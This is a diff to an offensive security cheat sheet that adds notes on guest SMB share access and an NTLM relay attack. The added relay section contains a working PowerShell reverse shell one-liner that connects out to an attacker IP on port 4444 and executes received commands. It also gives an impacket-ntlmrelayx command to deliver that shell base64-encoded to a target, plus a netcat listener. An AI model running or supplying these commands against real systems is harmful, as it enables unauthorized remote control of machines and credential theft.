@@ -943,12 +943,13 @@ smbclient //server/share -U <username>
 smbclient //server/share -U domain/username
 smbclient //<IP Address or Hostname>/<Share Name> -U <username>%<password>
 
+#Domain
+smbclient //192.168.197.159/SQL -U zeus/guest  # WIthout password got the sqlconnection.sql their is a creds
 
 #SMBCLIENT Shell, Download multiple file using, It will download only file not folders
 recurse ON
 prompt OFF
 mget *     # It will don't prompt
-
 
 #SMBMAP 
 smbmap -H <target_ip>
@@ -3119,6 +3120,14 @@ impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives u
 .\Rubeus.exe asreproast /nowrap #dumping from compromised windows host
 
 hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
+```
+
+### NTLMRealyx 
+- Encode the powershell one liner with base64
+```powershell
+echo "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.248',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" | base64 # paste the code below
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.197.160 -c "powershell -enc <code>"
+rlwrap nc -nlvp 4444
 ```
 
 ### Account Operator and WriteDacl or DCSync AD 
